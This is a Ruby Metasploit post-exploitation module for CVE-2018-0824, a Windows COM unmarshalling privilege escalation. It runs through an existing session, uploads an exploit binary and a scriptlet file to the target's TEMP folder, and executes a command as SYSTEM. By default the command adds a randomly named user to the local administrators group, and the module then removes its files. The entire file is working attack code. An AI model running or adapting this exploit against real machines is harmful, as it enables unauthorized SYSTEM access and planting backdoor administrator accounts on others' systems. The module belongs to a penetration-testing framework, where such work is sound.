# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/post/common'
require 'msf/core/post/file'
require 'msf/core/post/windows/priv'

class MetasploitModule < Msf::Post
  include Msf::Post::Common
  include Msf::Post::File
#  include Msf::Post::Windows::Priv

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Windows unmarshal post exploitation',
      'Description' => %q{
        This module exploits a local privilege escalation bug which exists
        in microsoft COM for windows when it fails to properly handle serialized objects.},
      'References'  =>
        [
          ['CVE', '2018-0824'],
          ['URL', 'https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-0824'],
          ['URL', 'https://github.com/x73x61x6ex6ax61x79/UnmarshalPwn'],
          ['EDB', '44906']
        ],
      'Author'      =>
        [
          'Nicolas Joly', # Vulnerability discovery
          'Matthias Kaiser', # Exploit PoC
          'Sanjay Gondaliya', # Modified PoC
          'Pratik Shah <pratik@notsosecure.com>' # Metasploit module
        ],
      'DisclosureDate' => 'Aug 05 2018',
      'Platform'       => ['win'],
      'Targets'        =>
        [
          ['Windows x64', { 'Arch' => ARCH_X64 }]
        ],
      'License'        => MSF_LICENSE,
    ))

    register_options(
      [
      OptString.new('COMMAND',
        [false, 'The command to execute as SYSTEM (Can only be a cmd.exe builtin or Windows binary, (net user /add %RAND% %RAND% & net localgroup administrators /add <user>).', nil]),
      OptString.new('EXPLOIT_NAME',
        [false, 'The filename to use for the exploit binary (%RAND% by default).', nil]),
      OptString.new('SCRIPT_NAME',
        [false, 'The filename to use for the COM script file (%RAND% by default).', nil]),
      OptString.new('PATH',
        [false, 'Path to write binaries (%TEMP% by default).', nil]),
      ])
  end

  def setup
    super
    validate_active_host
    @exploit_name = datastore['EXPLOIT_NAME'] || Rex::Text.rand_text_alpha((rand(8) + 6))
    @script_name = datastore['SCRIPT_NAME'] || Rex::Text.rand_text_alpha((rand(8) + 6))
    @exploit_name = "#{exploit_name}.exe" unless exploit_name.match(/\.exe$/i)
    @script_name = "#{script_name}.sct" unless script_name.match(/\.sct$/i)
    @temp_path = datastore['PATH'] || session.sys.config.getenv('TEMP')
    @exploit_path = "#{temp_path}\\#{exploit_name}"
    @script_path = "#{temp_path}\\#{script_name}"
  end

  def populate_command
    username = Rex::Text.rand_text_alpha((rand(8) + 6))
    password = Rex::Text.rand_text_alpha((rand(8) + 6))
    print_status("username = #{username}, password = #{password}")
    cmd_to_run = 'net user /add ' + username + ' ' + password
    cmd_to_run += '  & net localgroup administrators /add ' + username
    print_status(cmd_to_run)
    return cmd_to_run
  end

  def validate_active_host
    begin
      print_status("Attempting to Run on #{sysinfo['Computer']} via session ID: #{datastore['SESSION']}")
    rescue Rex::Post::Meterpreter::RequestError => e
      elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
      raise Msf::Exploit::Failed, 'Could not connect to session'
    end
  end

  def validate_remote_path(path)
    unless directory?(path)
      fail_with(Failure::Unreachable, "#{path} does not exist on the target")
    end
  end

  def validate_target
    if sysinfo['Architecture'] == ARCH_X86
      fail_with(Failure::NoTarget, 'Exploit code is 64-bit only')
    end
    if sysinfo['OS'] =~ /XP/
      fail_with(Failure::Unknown, 'The exploit binary does not support Windows XP')
    end
  end

  def ensure_clean_destination(path)
    if file?(path)
      print_status("#{path} already exists on the target. Deleting...")
      begin
        file_rm(path)
        print_status("Deleted #{path}")
      rescue Rex::Post::Meterpreter::RequestError => e
        elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
        print_error("Unable to delete #{path}")
      end
    end
  end

  def upload_exploit
    local_exploit_path = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2018-0824', 'UnmarshalPwn.exe')
    upload_file(exploit_path, local_exploit_path)
    print_status("Exploit uploaded on #{sysinfo['Computer']} to #{exploit_path}")
  end

  def upload_script(cmd_to_run)
    vprint_status("Creating the sct file with command #{cmd_to_run}")
    local_script_template_path = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2018-0824', 'script_template')
    script_template_data = ::IO.read(local_script_template_path)
    vprint_status("script_template_data.length =  #{script_template_data.length}")
    full_command = 'cmd.exe /c ' + cmd_to_run
    full_command = full_command
    script_data = script_template_data.sub!('SCRIPTED_COMMAND', full_command)
    if script_data == nil
      fail_with(Failure::BadConfig, "Failed to substitute command in script_template")
    end
    vprint_status("Writing #{script_data.length} bytes to #{script_path} to target")
    write_file(script_path, script_data)
    vprint_status('Script uploaded successfully')
  end

  def run
    if datastore['COMMAND'].nil?
      cmd_to_run = populate_command
    else
      cmd_to_run = datastore['COMMAND']
    end
    print_status("exploit path is: #{exploit_path}")
    print_status("script path is: #{script_path}")
    print_status("command is: #{cmd_to_run}")
    begin
      validate_active_host
      validate_target
      validate_remote_path(temp_path)
      ensure_clean_destination(exploit_path)
      ensure_clean_destination(script_path)
      vprint_status("Uploading Script to #{script_path}")
      upload_script(cmd_to_run)
      vprint_status("Uploading Exploit to #{exploit_path}")
      upload_exploit
      vprint_status('Launching Exploit...')
      command_output = cmd_exec(exploit_path + ' ' + script_path)
      vprint_status(command_output)
      print_good('Exploit Completed')
      ensure_clean_destination(exploit_path)
      ensure_clean_destination(script_path)
    rescue Rex::Post::Meterpreter::RequestError => e
      elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
      print_good('Command failed, cleaning up')
      print_error(e.message)
      ensure_clean_destination(exploit_path)
      ensure_clean_destination(script_path)
    end
  end
  attr_reader :exploit_name
  attr_reader :script_name
  attr_reader :temp_path
  attr_reader :exploit_path
  attr_reader :script_path
end

